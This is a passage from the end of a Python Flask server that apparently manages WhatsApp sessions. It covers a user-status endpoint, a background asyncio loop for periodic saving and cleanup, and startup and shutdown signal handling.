            with open('./wa_users.json', 'r') as f:
                users = json.load(f)
                if userId in users:
                    return jsonify({"status": "connected", "user": users[userId]})
        return jsonify({"status": "waiting"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# ====== Helper ======
def run_in_main(coro):
    from shared import main_loop
    future = asyncio.run_coroutine_threadsafe(coro, main_loop)
    return future.result(timeout=60)

# ====== Startup ======
def start_background_loop():
    """Start the asyncio event loop in a background thread"""
    asyncio.set_event_loop(main_loop)
    main_loop.create_task(periodic_save())
    main_loop.create_task(cleanup_expired())
    main_loop.run_forever()

if __name__ == '__main__':
    threading.Thread(target=start_background_loop, daemon=True).start()

    future = asyncio.run_coroutine_threadsafe(load_and_start_all_sessions(), main_loop)
    try:
        future.result(timeout=30)
    except Exception as e:
        logger.error(f"Failed to load sessions: {e}")

    def handle_shutdown(signum, frame):
        logger.info("Received shutdown signal")
        try:
            future = asyncio.run_coroutine_threadsafe(shutdown(), main_loop)
            future.result(timeout=10)
        except:
            pass
        sys.exit(0)

    signal.signal(signal.SIGTERM, handle_shutdown)
    signal.signal(signal.SIGINT, handle_shutdown)

    port = int(os.environ.get('PORT', 8080))
    logger.info(f"Server starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
